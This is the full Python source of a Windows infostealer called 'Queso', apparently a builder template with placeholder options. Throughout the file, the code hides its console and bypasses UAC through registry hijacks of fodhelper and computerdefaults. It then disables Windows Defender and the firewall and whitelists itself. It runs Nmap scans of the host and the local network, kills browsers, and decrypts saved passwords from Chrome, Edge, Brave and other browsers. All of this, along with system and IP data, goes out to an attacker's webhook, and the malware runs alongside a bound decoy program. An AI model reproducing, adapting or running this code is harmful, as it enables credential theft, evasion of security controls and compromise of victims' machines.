import os
import sys
import subprocess
import ctypes
from threading import Thread
from urllib3 import PoolManager
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import random
import nmap3
from xml.etree import ElementTree
import zipfile
import shutil
import traceback


class Syscalls:

    @staticmethod
    def HideConsole():
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    @staticmethod
    def CryptUnprotectData(encrypted_data: bytes):

        class DATA_BLOB(ctypes.Structure):

            _fields_ = [
                ("cbData", ctypes.c_ulong),
                ("pbData", ctypes.POINTER(ctypes.c_ubyte))
            ]

        pdata_in = DATA_BLOB(len(encrypted_data), ctypes.cast(encrypted_data, ctypes.POINTER(ctypes.c_ubyte)))
        pdata_out = DATA_BLOB()
        
        if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pdata_in), None, None, None, None, 0, ctypes.byref(pdata_out)):
            data_out = (ctypes.c_ubyte * pdata_out.cbData)()
            ctypes.memmove(data_out, pdata_out.pbData, pdata_out.cbData)
            ctypes.windll.Kernel32.LocalFree(pdata_out.pbData)
            return bytes(data_out)

        raise ValueError("Invalid encrypted_data provided.")
    

class Errors:

    error_list: list[str] = []

    @staticmethod
    def Catch(catch_function):
        def function_wrapper(*args, **kwargs):
            try:
                return catch_function(*args, **kwargs)
            except Exception as catch_error:
                if isinstance(catch_error, KeyboardInterrupt):
                    os._exit(1)
                if not isinstance(catch_error, UnicodeEncodeError):
                    catch_traceback = traceback.format_exc()
                    Errors.error_list.append(catch_traceback)

        return function_wrapper


class Utility:

    @staticmethod
    def GetSelf(): # Get the location of the file and whether exe mode is enabled or not
        if hasattr(sys, "frozen"):
            return (sys.executable, True)
        else:
            return (__file__, False)

    @staticmethod
    def IsAdmin():
        return subprocess.run("net session", shell= True, capture_output= True).returncode == 0

    @staticmethod
    def UACbypass(bypass_method: int = 1): # Bypass UAC
        if Utility.GetSelf()[1]:
            execute = lambda cmd: subprocess.run(cmd, shell= True, capture_output= True).returncode == 0
        
            if bypass_method == 1:
                if not execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f"): Utility.UACbypass(2)
                if not execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f"): Utility.UACbypass(2)
                execute("computerdefaults --nouacbypass")
                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")
            
            elif bypass_method == 2:
                execute(f"reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /d \"{sys.executable}\" /f")
                execute("reg add hkcu\Software\\Classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f")
                execute("fodhelper --nouacbypass")
                execute("reg delete hkcu\Software\\Classes\\ms-settings /f")

            os._exit(0)

    @staticmethod
    def GetRandomString(length: int = 5, invisible: bool = False): # Generates a random string
        if invisible:
            return "".join(random.choices(["\xa0", chr(8239)] + [chr(rand_char) for rand_char in range(8192, 8208)], k= length))
        else:
            return "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k= length))
        
    @staticmethod
    def CreateZip(zip_data: dict): # Create a zip file
        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "data.zip"), "w") as data_pack:
            for file_extension in zip_data:
                for file_name in zip_data[file_extension]:
                    file_data = zip_data[file_extension][file_name]
                    with data_pack.open(f"{file_name}.{file_extension}", "w") as zip_file:
                        if file_extension == "xml":
                            zip_file.write(bytes(ElementTree.tostring(file_data).decode('utf-8'), 'utf-8'))
                        else:
                            zip_file.write(bytes(file_data, 'utf-8'))

    @staticmethod
    def KillTask(*task_list: str):
        task_list = list(map(lambda task_x: task_x.lower(), task_list))
        cmd = subprocess.run("tasklist /FO LIST", shell= True, capture_output= True).stdout.decode(errors= "ignore")
        cmd_out = cmd.strip().split('\r\n\r\n')
        for cmd_i in cmd_out:
            cmd_i = cmd_i.split("\r\n")[:2]
            try:
                proc_name, proc_id = cmd_i[0].split()[-1], int(cmd_i[1].split()[-1])
                proc_name = proc_name[:-4] if proc_name.endswith(".exe") else proc_name
                if proc_name.lower() in task_list:
                    subprocess.run("taskkill /F /PID %d" % proc_id, shell= True, capture_output= True)
            except Exception:
                pass


class Network:

    @staticmethod
    def GetNetAdapters(): # Get a list of network adapters
        adapters = list()
        cmd = subprocess.run(
            "powershell -Command Get-NetAdapter -Name *",
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        lines_out = cmd.stdout.decode('utf-8').split('\n')
        for line_out in lines_out:
            if line_out.startswith("Name") or line_out.startswith("----") or line_out.isspace():
                pass
            else:
                print(line_out)
                adapter = line_out.split("   ")[0]
                if "..." in adapter:
                    pass
                else:
                    adapters.append(adapter)
        return adapters
    
    @staticmethod
    def GetNetConnection(adapter: str): # Get an adapter's network connection
        cmd = subprocess.run(
            "powershell -Command Get-NetConnectionProfile -InterfaceAlias \"{}\"".format(adapter),
            shell= True, stdout= subprocess.PIPE, stderr= subprocess.PIPE
        )
        lines_out = cmd.stdout.decode('utf-8').split('\n')
        connection = ""
        for line_out in lines_out:
            if line_out.startswith("Name"):
                connection = line_out.split(" : ")[1]
                break
        if connection:
            return connection
        return "None"

    @staticmethod
    def DisableFirewall(): # Disable Windows Firewall
        adapters = Network.GetNetAdapters()
        for adapter in adapters: # Loop over all adapters
            print(adapter)
            connection = Network.GetNetConnection(adapter)
            if connection == "None":
                pass
            else: # Set network type to private
                subprocess.Popen(
                    "powershell -Command Set-NetConnectionProfile -Name '{}' -NetworkCategory Private".format(connection),
                    shell= True
                )
            # Disable firewall on private networks
        subprocess.Popen(
            "powershell -Command Set-NetFirewallProfile -Profile Private -Enabled False",
            shell= True
        )

    @staticmethod
    def ExcludeFromFirewall(filepath: str = None): # Exclude a file from Windows Firewall
        if filepath is None:
            filepath = Utility.GetSelf()[0]
        subprocess.Popen("netsh advfirewall firewall add rule name='tcpclient' dir='in' action='allow' program='{}'".format(filepath))

    @staticmethod
    def InstallNmap(): # Install Nmap
        with zipfile.ZipFile(os.path.join(sys._MEIPASS, "nmap.zip"), "r") as nmap_zip:
            nmap_zip.extractall("C:\\Program Files (x86)")

    @staticmethod
    def NmapScan(ip_range: str, nmap_arguments: str ="-sV -T4 -O -F --version-light"): # Perform an Nmap scan
        nmap_session = nmap3.Nmap()
        return nmap_session.scan_command(ip_range, nmap_arguments)
    
class Defender:

    @staticmethod
    def ExcludeFromDefender(filepath: str = None): # Exclude a file from Windows Defender
        if filepath is None:
            filepath = Utility.GetSelf()[0]
        subprocess.Popen(
            "powershell -Command Add-MpPreference -ExclusionPath '{}'".format(filepath),
            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
        )

    @staticmethod
    def DisableDefender(): # Disable Windows Defender
        subprocess.Popen(
            "powershell -Command Set-MpPreference -DisableBehaviorMonitoring $True -DisableRealtimeMonitoring $True",
            shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE
        )


class Tasks:

    task_threads: list[Thread] = list()

    @staticmethod
    def AddTask(task: Thread):
        Tasks.task_threads.append(task)

    @staticmethod
    def WaitForAll():
        for task_thread in Tasks.task_threads:
            task_thread.join()


class Browsers:

    class Chromium:

        BrowserPath: str = None
        EncryptionKey: bytes = None

        def __init__(self, browser_path: str):
            if not os.path.isdir(browser_path):
                raise NotADirectoryError("Browser path not found.")
            
            self.BrowserPath = browser_path

        def GetEncryptionKey(self): # Get the browser's encryption key
            if self.EncryptionKey is not None:
                return self.EncryptionKey
            
            else:
                # Look for local state file
                local_state_path = os.path.join(self.BrowserPath, "Local State")
                if os.path.isfile(local_state_path):
                    with open(local_state_path, encoding= "utf-8", errors= "ignore") as local_state_file:
                        # Load contents to json
                        json_content: dict = json.load(local_state_file)

                    # Decode and unprotect the encryption key
                    encrypted_key: str = json_content["os_crypt"]["encrypted_key"]
                    encrypted_key = base64.b64decode(encrypted_key.encode())[5:]
                    self.EncryptionKey = Syscalls.CryptUnprotectData(encrypted_key)
                    
                    return self.EncryptionKey
                
                else:
                    return None
                
        def DecryptData(self, buffer: bytes, encryption_key: bytes): # Decrypt data
            encryption_version = buffer.decode(errors= "ignore")

            # Detect encryption version
            if encryption_version.startswith(("v10", "v11")):
                # Set IV and Data
                encrypt_iv = buffer[3:15]
                cipher_data = buffer[15:]
                # Decrypt using AES256-GCM
                encryption_cipher = AES.new(encryption_key, AES.MODE_GCM, encrypt_iv)
                decrypted_data = encryption_cipher.decrypt(cipher_data)[:-16].decode()
                return decrypted_data
            else:
                # Decrypt using CryptUnprotectData
                return str(Syscalls.CryptUnprotectData(buffer))            
            
        def GetCreds(self): # Get the browser's credentials
            encryption_key = self.GetEncryptionKey()
            password_list = list()

            if encryption_key is None:
                return password_list
            
            login_file_paths = list()

            for browser_root, _, browser_files in os.walk(self.BrowserPath): # Find login file paths
                for browser_file in browser_files:
                    if browser_file.lower() == "login data":
                        file_path = os.path.join(browser_root, browser_file)
                        login_file_paths.append(file_path)
            
            for login_file_path in login_file_paths:
                while True: # Maintain a temp file
                    tempfile = os.path.join(os.getenv("temp"), Utility.GetRandomString(10) + ".tmp")
                    if not os.path.isfile(tempfile):
                        break

                try: # Copy the login file's contents to the temp file
                    shutil.copy(login_file_path, tempfile)
                except Exception:
                    continue

                # Connect to the temp file with sql
                password_db = sqlite3.connect(tempfile)
                password_db.text_factory = lambda encoded_data : encoded_data.decode(errors= "ignore")
                db_cursor = password_db.cursor()

                try:
                    # Get the credentials
                    password_results = db_cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

                    # Decrypt the passwords and add to the password list
                    for pass_url, pass_user, pass_password in password_results:
                        if pass_url and pass_user and pass_password:
                            password_list.append((pass_url, pass_user, self.DecryptData(pass_password, encryption_key)))
                
                except Exception:
                    pass

                # Close the files
                db_cursor.close()
                password_db.close()
                os.remove(tempfile)

            return password_list


class Queso:

    Webhook: str = "%webhook%"
    TempFolder: str = None

    def __init__(self) -> None:

        while True: # Maintain a temp folder
            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok= True)
                break

        default_tasks = (
            (self.LaunchBoundApplication, False),
            (self.SendData, False)
        )

        # Hide the console
        Syscalls.HideConsole()

        if "%uacbypass%":
            if not Utility.IsAdmin(): # If not an admin, try to be one
                if Utility.GetSelf()[1] and not "--no-bypass" in sys.argv:
                        Utility.UACbypass()

        if Utility.IsAdmin(): # We're admin now
            
            if "%disable_defender%":
                # Disable Windows Defender and exclude this file
                Defender.DisableDefender()
                Defender.ExcludeFromDefender()

            if "%disable_firewall%":
                # Disable Windows Firewall and exclude this file
                Network.DisableFirewall()
                Network.ExcludeFromFirewall()

            if not os.path.exists("C:\\Program Files (x86)\\Nmap"): # Install Nmap if it doesn't exist
                Network.InstallNmap()

        for task_func, task_daemon in default_tasks: # Start user tasks
            default_task_thread = Thread(target= task_func, daemon= task_daemon)
            default_task_thread.start()
            Tasks.AddTask(default_task_thread)

        Tasks.WaitForAll()

    def LaunchBoundApplication(self): # Launch the bound application
        boundExePath = os.path.join(sys._MEIPASS, "bound", "bound.exe")
        if os.path.isfile(boundExePath):
            subprocess.Popen("{}".format(boundExePath))

    @Errors.Catch
    def StealBrowserCreds(self):
        browser_threads: list[Thread] = []
        browser_paths = {
            "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
            "Chrome" : (os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"), "chrome"),
            "Chromium" : (os.path.join(os.getenv("localappdata"), "Chromium", "User Data"), "chromium"),
            "Comodo" : (os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"), "comodo"),
            "Edge" : (os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"), "msedge"),
            "EpicPrivacy" : (os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"), "epic"),
            "Iridium" : (os.path.join(os.getenv("localappdata"), "Iridium", "User Data"), "iridium"),
            "Opera" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"), "opera"),
            "Opera GX" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"), "operagx"),
            "Slimjet" : (os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"), "slimjet"),
            "UR" : (os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"), "urbrowser"),
            "Vivaldi" : (os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"), "vivaldi"),
            "Yandex" : (os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data"), "yandex")
        }

        for browser_name, browser_item in browser_paths.items():
            browser_path, process_name = browser_item
            if os.path.isdir(browser_path):
                def browser_steal(d_name, d_path):
                    try:
                        Utility.KillTask(process_name)
                        browser_instance = Browsers.Chromium(d_path)
                        password_file_path = os.path.join(sys._MEIPASS, "dumped_creds.txt")

                        browser_passwords = browser_instance.GetCreds()

                        if browser_passwords:
                            passwords_out = ["{},{},{}\n".format(*password_data) for password_data in browser_passwords]
                            if not os.path.exists(password_file_path):
                                with open(password_file_path, "w") as password_file:
                                    password_file.write("".join(passwords_out))
                            else:
                                with open(password_file_path, "a") as password_file:
                                    password_file.write("".join(passwords_out))
                    
                    except Exception:
                        pass
                
                browser_thread = Thread(target= browser_steal, args= (browser_name, browser_path))
                browser_thread.start()
                browser_threads.append(browser_thread)
            
        for browser_thread in browser_threads:
            browser_thread.join()

    def SendData(self): # Send gathered data to the webhook

        if "%log_sysinfo%":
            # Gather system information
            computer_name = os.getenv("computername")
            computer_os = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
            computer_uuid = subprocess.run('wmic csproduct get uuid', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1]
            cpu = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:System\\CurrentControlSet\\Control\\Session Manager\\Environment' -Name PROCESSOR_IDENTIFIER", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
            gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
            productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()

            sys_info = f"""
                \nComputer Name: {computer_name}
                \nOS: {computer_os}
                \nUUID: {computer_uuid}
                \nCPU: {cpu}
                \nGPU: {gpu}
                \nProduct Key: {productKey}
            """

        http_manager = PoolManager()

        if "%log_ipinfo%":
            try: # Try to gather IP information
                result: dict = json.loads(http_manager.request("GET", "http://ip-api.com/json/").data.decode())
                if result.get("status") != "success":
                    raise Exception("Failed to retrieve IP info")
                ip_data = f"""
                    \nIP: {result['query']}
                    \nCountry: {result['country']}
                    \nTimezone: {result['timezone']}
                    \nRegion: {result['regionName']}
                    \nZIP: {result['zip']}
                    \nCoordinates: [{result['lat']}, {result['lon']}]
                    \nISP: {result['isp']}
                """
            except Exception: # Throw an error if we can't
                ip_info = "(No IP info)"
            else:
                ip_info = ip_data

        # Create the embed
        webhook_payload = {
            "embeds": [
                {
                    "title": "Queso Project",
                    "description": "**Info Gathered:**\n",
                    "footer": {
                        "text": "Information by Queso"
                    }
                }
            ],
            "username": "Queso"
        }

        if sys_info:
            webhook_payload["embeds"][0]["description"] += f"_System Info_\n```autohotkey\n{sys_info}```\n"
        if ip_info:
            webhook_payload["embeds"][0]["description"] += f"_IP Info_\n```prolog\n{ip_info}```\n"

        webhook_fields = dict()

        # Create a dict for our zip file data
        zip_data = {
            "xml": {},
            "txt": {}
        }

        if "%nmap_scan%":
            local_scan: ElementTree = None
            network_scan: ElementTree = None

            # Create a scan of the host system
            local_scan = Network.NmapScan("127.0.0.1")
            if local_scan:
                zip_data['xml']['localhost'] = local_scan

            # And a scan of the local network
            network_scan = Network.NmapScan("192.168.1.1/24")
            if network_scan:
                zip_data['xml']['localnetwork'] = network_scan
        
        if "%steal_credentials%":
            self.StealBrowserCreds()
            password_file_path = os.path.join(sys._MEIPASS, "dumped_creds.txt")
            if os.path.exists(password_file_path):
                with open(password_file_path, "r") as password_file:
                    zip_data['txt']['dumped_creds'] = password_file.read()

        # Try to create a zip file and attach it if we can
        Utility.CreateZip(zip_data)
        if os.path.exists(os.path.join(sys._MEIPASS, "data.zip")):
            with open(os.path.join(sys._MEIPASS, "data.zip"), "rb") as zip_file:
                webhook_fields['file'] = (f"{os.getlogin()}.zip", zip_file.read())


        webhook_fields['payload_json'] = json.dumps(webhook_payload).encode() # Append the embed
        http_manager.request("POST", self.Webhook, fields= webhook_fields) # Bon voyage!


if os.name == "nt":

    queso = Queso()
